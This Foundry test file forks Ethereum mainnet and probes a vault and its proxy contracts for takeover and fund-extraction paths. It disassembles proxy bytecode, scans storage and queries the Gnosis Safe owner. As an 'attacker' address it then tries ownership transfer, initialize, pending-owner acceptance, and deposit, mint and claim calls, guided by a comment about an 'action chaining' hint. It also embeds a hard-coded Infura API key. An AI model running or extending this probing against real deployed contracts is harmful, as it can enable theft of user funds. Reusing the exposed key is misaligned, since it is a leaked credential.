// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract VaultSlot2Proxy is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    address constant VAULT_SLOT2 = 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a;
    address constant VAULT_SLOT5 = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeVaultSlot2ProxyPattern() public view {
        console.log("=== ANALYZING VAULT_SLOT2 PROXY PATTERN ===\n");

        bytes memory code = VAULT_SLOT2.code;

        // Look at the first 100 bytes - typical proxy pattern
        console.log("First 100 bytes bytecode analysis:");

        for (uint i = 0; i < 100 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0xf4) console.log(i, "DELEGATECALL");
            if (op == 0xf1) console.log(i, "CALL");
            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x3d) console.log(i, "RETURNDATASIZE");
            if (op == 0x36) console.log(i, "CALLDATASIZE");
            if (op == 0x37) console.log(i, "CALLDATACOPY");

            // Look for PUSH operations that might indicate slot numbers
            if (op >= 0x60 && op <= 0x65) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                console.log(i, "PUSH val:", val);
            }
        }

        // Check EIP-1967 implementation slot
        bytes32 eip1967Slot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 impl = vm.load(VAULT_SLOT2, eip1967Slot);
        console.log("\nEIP-1967 implementation slot:");
        console.logBytes32(impl);

        // Check slot 0 (might be implementation)
        console.log("\nSlot 0:");
        console.logBytes32(vm.load(VAULT_SLOT2, bytes32(0)));

        // Check if slot 0 is an address with code
        address slot0Addr = address(uint160(uint256(vm.load(VAULT_SLOT2, bytes32(0)))));
        console.log("Slot 0 as address:", slot0Addr);
        console.log("Has code:", slot0Addr.code.length > 0);
    }

    function test_CheckVaultSlot2Implementation() public view {
        console.log("=== CHECKING VAULT_SLOT2 IMPLEMENTATION ===\n");

        // The DELEGATECALL at offset 64 probably loads implementation from storage
        // Let's check what storage slots might contain the implementation

        console.log("VAULT_SLOT2 storage scan:");
        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(VAULT_SLOT2, bytes32(i));
            if (slot != bytes32(0)) {
                address addr = address(uint160(uint256(slot)));
                console.log("Slot", i, ":");
                console.logBytes32(slot);
                if (addr != address(0) && addr.code.length > 0) {
                    console.log("  -> Contract:", addr);
                    console.log("  -> Code size:", addr.code.length);
                }
            }
        }

        // Check common proxy implementation slots
        bytes32[] memory commonSlots = new bytes32[](5);
        commonSlots[0] = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        commonSlots[1] = bytes32(uint256(keccak256("org.zeppelinos.proxy.implementation")));
        commonSlots[2] = bytes32(uint256(keccak256("PROXIABLE")));
        commonSlots[3] = bytes32(uint256(keccak256("implementation")));
        commonSlots[4] = bytes32(0);

        string[] memory slotNames = new string[](5);
        slotNames[0] = "EIP-1967";
        slotNames[1] = "ZeppelinOS";
        slotNames[2] = "PROXIABLE";
        slotNames[3] = "implementation";
        slotNames[4] = "slot0";

        console.log("\nCommon proxy slots:");
        for (uint i = 0; i < commonSlots.length; i++) {
            bytes32 val = vm.load(VAULT_SLOT2, commonSlots[i]);
            if (val != bytes32(0)) {
                console.log(slotNames[i], ":");
                console.logBytes32(val);
            }
        }
    }

    function test_FindVaultSlot2DelegatecallTarget() public view {
        console.log("=== FINDING VAULT_SLOT2 DELEGATECALL TARGET ===\n");

        bytes memory code = VAULT_SLOT2.code;

        // The DELEGATECALL at 64 - let's trace what slot is loaded
        console.log("Bytecode around DELEGATECALL at 64:");

        for (uint i = 0; i < 80 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            string memory opName = "";
            if (op == 0x00) opName = "STOP";
            else if (op == 0x36) opName = "CALLDATASIZE";
            else if (op == 0x37) opName = "CALLDATACOPY";
            else if (op == 0x3d) opName = "RETURNDATASIZE";
            else if (op == 0x3e) opName = "RETURNDATACOPY";
            else if (op == 0x54) opName = "SLOAD";
            else if (op == 0x55) opName = "SSTORE";
            else if (op == 0x80) opName = "DUP1";
            else if (op == 0x81) opName = "DUP2";
            else if (op == 0x82) opName = "DUP3";
            else if (op == 0x90) opName = "SWAP1";
            else if (op == 0x91) opName = "SWAP2";
            else if (op == 0xf1) opName = "CALL";
            else if (op == 0xf3) opName = "RETURN";
            else if (op == 0xf4) opName = "DELEGATECALL";
            else if (op == 0xfd) opName = "REVERT";
            else if (op == 0x5b) opName = "JUMPDEST";
            else if (op == 0x56) opName = "JUMP";
            else if (op == 0x57) opName = "JUMPI";

            if (bytes(opName).length > 0) {
                console.log(i, opName);
            }

            if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                console.log(i, "PUSH:", val);
                i += size; // Skip the pushed bytes
            }
        }

        // Check slot 0 which often contains owner or implementation
        bytes32 slot0 = vm.load(VAULT_SLOT2, bytes32(0));
        address slot0Addr = address(uint160(uint256(slot0)));
        console.log("\nSlot 0 address:", slot0Addr);

        if (slot0Addr.code.length > 0) {
            console.log("This is likely the owner (Safe), not implementation");

            // Check other slots for implementation
            bytes32 slot1 = vm.load(VAULT_SLOT2, bytes32(uint256(1)));
            address slot1Addr = address(uint160(uint256(slot1)));
            console.log("\nSlot 1 address:", slot1Addr);
            if (slot1Addr.code.length > 0) {
                console.log("Slot 1 has code - potential implementation");
                console.log("Code size:", slot1Addr.code.length);
            }
        }
    }

    function test_AnalyzeVaultSlot2Owner() public view {
        console.log("=== ANALYZING VAULT_SLOT2 OWNER (SAFE) ===\n");

        // Slot 0 is the owner - which is a Gnosis Safe
        bytes32 slot0 = vm.load(VAULT_SLOT2, bytes32(0));
        address owner = address(uint160(uint256(slot0)));
        console.log("Owner (Safe):", owner);

        // Get Safe's owners
        (bool s, bytes memory d) = owner.staticcall(
            abi.encodeWithSignature("getOwners()")
        );
        if (s) {
            address[] memory owners = abi.decode(d, (address[]));
            console.log("Safe has", owners.length, "owners:");
            for (uint i = 0; i < owners.length; i++) {
                console.log("  ", owners[i]);
            }
        }

        // Get Safe's modules
        (bool s2, bytes memory d2) = owner.staticcall(
            abi.encodeWithSignature("getModules()")
        );
        if (s2 && d2.length > 0) {
            console.log("\nSafe modules:");
            console.logBytes(d2);
        }

        // Check if Safe has any enabled modules
        (bool s3, bytes memory d3) = owner.staticcall(
            abi.encodeWithSignature("getModulesPaginated(address,uint256)", address(0x1), 10)
        );
        if (s3 && d3.length > 0) {
            console.log("\nSafe modules (paginated):");
            console.logBytes(d3);
        }
    }

    function test_CheckIfVaultSlot2CanBeHijacked() public {
        console.log("=== CHECKING IF VAULT_SLOT2 CAN BE HIJACKED ===\n");

        // Check pending owner
        (bool s1, bytes memory d1) = VAULT_SLOT2.staticcall(
            abi.encodeWithSignature("pendingOwner()")
        );
        if (s1 && d1.length >= 32) {
            address pending = abi.decode(d1, (address));
            console.log("Pending owner:", pending);

            if (pending != address(0)) {
                console.log("*** THERE IS A PENDING OWNER! ***");

                // Try to accept as pending owner
                vm.startPrank(pending);
                (bool s2,) = VAULT_SLOT2.call(
                    abi.encodeWithSignature("acceptOwnership()")
                );
                console.log("acceptOwnership:", s2);
                vm.stopPrank();
            }
        }

        // Try to set pending owner as attacker
        vm.startPrank(attacker);
        (bool s3, bytes memory d3) = VAULT_SLOT2.call(
            abi.encodeWithSignature("transferOwnership(address)", attacker)
        );
        console.log("transferOwnership as attacker:", s3);
        if (!s3 && d3.length >= 4) {
            console.logBytes4(bytes4(d3));
        }
        vm.stopPrank();

        // Check if there's an initialize function
        vm.startPrank(attacker);
        (bool s4, bytes memory d4) = VAULT_SLOT2.call(
            abi.encodeWithSignature("initialize(address)", attacker)
        );
        console.log("initialize as attacker:", s4);
        if (!s4 && d4.length >= 4) {
            console.logBytes4(bytes4(d4));
        }
        vm.stopPrank();
    }

    function test_VaultCallToSlot2() public {
        console.log("=== TESTING VAULT CALL TO SLOT2 ===\n");

        // The Vault has "PUSH1 2 + SLOAD at 929 -> CALL at 958"
        // This means Vault CALLs to VAULT_SLOT2 for some function
        // Let's find which function triggers this

        bytes memory vaultCode = VAULT.code;

        // Look at what happens at offset 929
        console.log("Vault bytecode around offset 929:");
        for (uint i = 900; i < 980 && i < vaultCode.length; i++) {
            uint8 op = uint8(vaultCode[i]);

            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0xf1) console.log(i, "CALL");
            if (op == 0xf4) console.log(i, "DELEGATECALL");
            if (op == 0x33) console.log(i, "CALLER");

            if (op >= 0x60 && op <= 0x65) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < vaultCode.length; j++) {
                    val = val << 8 | uint8(vaultCode[i + 1 + j]);
                }
                console.log(i, "PUSH:", val);
            }
        }

        // Find which function selector is near offset 929
        console.log("\nLooking for selectors before offset 929:");
        for (uint i = 800; i < 930 && i < vaultCode.length; i++) {
            if (uint8(vaultCode[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(
                    vaultCode[i+1], vaultCode[i+2], vaultCode[i+3], vaultCode[i+4]
                ));
                if (sel != bytes4(0) && sel != bytes4(0xffffffff)) {
                    console.log("Selector at", i, ":");
                    console.logBytes4(sel);
                }
            }
        }
    }

    function test_ActionChainingHypothesis() public {
        console.log("=== ACTION CHAINING HYPOTHESIS ===\n");

        // The "action chaining" hint suggests:
        // Step 1: Extract assets to a proxy attacker owns
        // Step 2: Extract from that proxy

        // What if:
        // 1. We deposit to VAULT_SLOT2 or similar
        // 2. Somehow get shares/position credited to us
        // 3. Use that position to trigger a redemption path

        // Check if VAULT_SLOT2 holds any valuable tokens
        uint256 slot2WstETH = IERC20(wstETH).balanceOf(VAULT_SLOT2);
        console.log("VAULT_SLOT2 wstETH:", slot2WstETH / 1e18);

        uint256 slot5WstETH = IERC20(wstETH).balanceOf(VAULT_SLOT5);
        console.log("VAULT_SLOT5 wstETH:", slot5WstETH / 1e18);

        // Check if Vault delegates any withdraw/redeem functions
        console.log("\nTrying to withdraw through various paths:");

        vm.startPrank(attacker);
        deal(wstETH, attacker, 1000e18);
        IERC20(wstETH).approve(VAULT, type(uint256).max);
        IERC20(wstETH).approve(VAULT_SLOT2, type(uint256).max);

        // Try deposit first
        (bool s1,) = VAULT.call(
            abi.encodeWithSignature("deposit(uint256,address)", 10e18, attacker)
        );
        console.log("VAULT.deposit:", s1);

        // Try mint
        (bool s2,) = VAULT.call(
            abi.encodeWithSignature("mint(uint256,address)", 10e18, attacker)
        );
        console.log("VAULT.mint:", s2);

        // Try claiming
        (bool s3,) = VAULT_SLOT2.call(
            abi.encodeWithSignature("claimRewards()")
        );
        console.log("VAULT_SLOT2.claimRewards:", s3);

        vm.stopPrank();
    }
}
